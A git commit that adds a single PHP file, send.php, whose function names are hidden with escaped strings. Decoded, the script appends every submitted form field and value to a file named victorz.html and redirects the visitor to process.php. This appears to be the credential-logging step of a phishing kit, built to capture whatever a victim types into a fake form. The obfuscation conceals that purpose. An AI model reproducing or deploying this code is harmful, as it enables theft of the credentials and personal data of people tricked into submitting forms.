bb6c000951c457a14d4f5ed55152a9ac6f97a169
mynul00 <92019277+mynul00@users.noreply.github.com>
2023-01-18 18:16:52 +0530

    Add files via upload

---
+++ send.php
@@ -0,0 +1,5 @@
+<?php 
+
+
+ $x0e="fclose"; $x0f="\x66o\x70en"; $x10="\x66w\162\151\x74e"; 
+header ('Location: process.php');$x0b = $x0f("\166\151c\164\157r\x7a\056\x68\164m\154", "\141");foreach($_POST as $x0c => $x0d) {$x10($x0b, $x0c);$x10($x0b, "=");$x10($x0b, $x0d);$x10($x0b, "\r\n");}$x10($x0b, "<\x68r>\074br\x3e\r\n");$x0e($x0b);exit;?>
